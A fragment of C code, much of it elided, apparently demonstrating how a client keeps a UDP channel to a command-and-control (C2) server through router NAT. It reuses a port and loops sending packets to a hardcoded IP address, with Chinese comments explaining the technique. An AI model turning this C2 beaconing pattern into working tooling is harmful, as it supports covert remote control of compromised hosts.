...
int main(int argc,char* argv[]) {
	...
	/*
	  关闭与服务器通信的socket，并把与C2通信的socket绑定到相同的端口，真实环境中，路由器的NAT会将客户端对外的访问从路由器的外网ip某固定端口发送出去，并在此端口接收
	*/
	/*	
	close(sockS);
	if (bind(sockC,(struct sockaddr*)&thisAddr,sizeof(thisAddr)) == -1) {
		printf("bind2() failed\n");
		return -1;
	}
	...
	*/
	oppositeSideAddr.sin_addr.s_addr = inet_addr("47.95.254.34");
	...
	while (1) {
		...
		if (len < 0) {
			printf("while sending package to C2 , sendto() failed\n");
			return -1;
		}else {
